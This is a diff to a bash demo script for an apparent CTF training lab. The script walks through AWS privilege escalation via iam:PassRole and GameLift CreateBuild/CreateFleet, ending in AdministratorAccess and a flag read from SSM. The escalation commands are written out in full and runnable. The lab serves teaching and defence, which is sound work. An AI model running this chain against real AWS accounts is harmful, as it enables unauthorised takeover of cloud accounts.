@@ -1,4 +1,5 @@
 #!/bin/bash
+set -e
 
 # Demo script for iam:PassRole + gamelift:CreateBuild + gamelift:CreateFleet privilege escalation
 # This scenario demonstrates how a user with PassRole, CreateBuild, and CreateFleet permissions
@@ -29,9 +30,10 @@ show_cmd() {
     echo -e "${DIM}[${label}]\$ $*${NC}"
 }
 
-# Display AND record an attack command
+# Display AND record an attack command (canonical 2-arg form: identity, command)
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -107,6 +109,14 @@ use_readonly_creds() {
     export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
     unset AWS_SESSION_TOKEN
 }
+
+# Source demo permissions library for validation restriction
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"
+
+# Restrict helpful permissions during validation run
+restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 
 # Step 2: Configure AWS credentials with starting user
 # [EXPLOIT]
@@ -244,7 +254,7 @@ echo -e "${YELLOW}Step 6: Uploading malicious build to GameLift${NC}"
 echo "Using gamelift upload-build to upload the malicious game server..."
 
 use_starting_creds
-show_attack_cmd "aws gamelift upload-build --name $BUILD_NAME --operating-system AMAZON_LINUX_2023 --server-sdk-version 5.2.0 --build-root $BUILD_ROOT --build-version 1.0.0 --region $AWS_REGION"
+show_attack_cmd "Attacker" "aws gamelift upload-build --name $BUILD_NAME --operating-system AMAZON_LINUX_2023 --server-sdk-version 5.2.0 --build-root $BUILD_ROOT --build-version 1.0.0 --region $AWS_REGION"
 UPLOAD_OUTPUT=$(aws gamelift upload-build \
     --name "$BUILD_NAME" \
     --operating-system AMAZON_LINUX_2023 \
@@ -325,7 +335,7 @@ echo "with SHARED_CREDENTIAL_FILE provider, so our game server process can read 
 echo "Admin Role ARN: $ADMIN_ROLE_ARN"
 
 use_starting_creds
-show_attack_cmd "aws gamelift create-fleet --name $FLEET_NAME --build-id $BUILD_ID --compute-type EC2 --ec2-instance-type c5.large --fleet-type ON_DEMAND --instance-role-arn $ADMIN_ROLE_ARN --instance-role-credentials-provider SHARED_CREDENTIAL_FILE --runtime-configuration ServerProcesses=[{LaunchPath=/local/game/gameserver.sh,ConcurrentExecutions=1}] --region $AWS_REGION"
+show_attack_cmd "Attacker" "aws gamelift create-fleet --name $FLEET_NAME --build-id $BUILD_ID --compute-type EC2 --ec2-instance-type c5.large --fleet-type ON_DEMAND --instance-role-arn $ADMIN_ROLE_ARN --instance-role-credentials-provider SHARED_CREDENTIAL_FILE --runtime-configuration ServerProcesses=[{LaunchPath=/local/game/gameserver.sh,ConcurrentExecutions=1}] --region $AWS_REGION"
 FLEET_OUTPUT=$(aws gamelift create-fleet \
     --name "$FLEET_NAME" \
     --build-id "$BUILD_ID" \
@@ -413,52 +423,83 @@ if [ "$ESCALATION_SUCCEEDED" != "true" ]; then
 fi
 echo ""
 
-# Step 10: Verify admin access
-echo -e "${YELLOW}Step 10: Verifying privilege escalation success${NC}"
-
 # Wait for IAM propagation
 echo "Waiting 15 seconds for IAM policy propagation..."
 sleep 15
 
-# [EXPLOIT]
-# Switch back to starting user credentials to prove escalation
-use_starting_creds
-export AWS_REGION=$AWS_REGION
-
-echo "Switched back to starting user credentials"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
-CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
-echo "Current identity: $CURRENT_IDENTITY"
-echo ""
-
 # [OBSERVATION]
-# Check attached policies
-echo "Checking attached policies on starting user..."
+# Step 10: Verify AdministratorAccess attachment using readonly creds
+# (iam:ListAttachedUserPolicies is a "helpful" permission for the starting user
+# and is explicitly denied during the restriction window — observe via ReadOnly.)
 use_readonly_creds
+echo -e "${YELLOW}Step 10: [OBSERVATION] Verifying AdministratorAccess attachment${NC}"
 show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
 ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --output table 2>&1)
 echo "$ATTACHED_POLICIES"
 echo -e "${GREEN}✓ AdministratorAccess policy confirmed on $STARTING_USER${NC}"
 echo ""
 
-# [OBSERVATION]
-# Verify actual admin access
-echo "Attempting to list IAM users..."
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
+# [EXPLOIT]
+# Step 11: Confirm admin access using the starting user's now-elevated credentials
+use_starting_creds
+echo -e "${YELLOW}Step 11: Confirming administrator access (as starting user)${NC}"
+echo "Attempting to list IAM users with the starting user's now-elevated credentials..."
+show_attack_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
 else
     echo -e "${RED}✗ Failed to list users (IAM may still be propagating)${NC}"
+    exit 1
+fi
+echo ""
+
+# [EXPLOIT]
+# Step 12: Capture the CTF flag
+# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
+# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
+# Retry briefly to absorb IAM propagation lag — ssm:GetParameter sometimes lags behind
+# iam:ListUsers across AWS service caches.
+use_starting_creds
+echo -e "${YELLOW}Step 12: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/gamelift-001-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+
+FLAG_VALUE=""
+SSM_ERR=""
+for attempt in 1 2 3 4; do
+    SSM_ERR=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>&1 > /tmp/flag_value_$$) || true
+    FLAG_VALUE=$(cat /tmp/flag_value_$$ 2>/dev/null)
+    if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+        break
+    fi
+    if [ "$attempt" -lt 4 ]; then
+        echo -e "${YELLOW}Flag read attempt $attempt did not succeed yet (likely IAM propagation); retrying in 10s...${NC}"
+        sleep 10
+    fi
+done
+rm -f /tmp/flag_value_$$
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME after 4 attempts${NC}"
+    if [ -n "$SSM_ERR" ]; then
+        echo -e "${RED}Last error: $SSM_ERR${NC}"
+    fi
+    exit 1
 fi
 echo ""
 
 # Clean up temporary files
 rm -rf $BUILD_ROOT
 
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with iam:PassRole, gamelift:CreateBuild, gamelift:CreateFleet)"
@@ -467,11 +508,13 @@ echo "3. Uploaded build to GameLift"
 echo "4. Created fleet with admin instance role and SHARED_CREDENTIAL_FILE provider"
 echo "5. Game server process used admin credentials to attach AdministratorAccess to starting user"
 echo "6. Achieved: Administrator Access"
+echo "7. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER → (gamelift:CreateBuild) → Upload malicious build"
 echo "  → (iam:PassRole + gamelift:CreateFleet) → Fleet with $ADMIN_ROLE_NAME"
 echo "  → Game server reads shared credentials → iam:AttachUserPolicy → Admin"
+echo "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
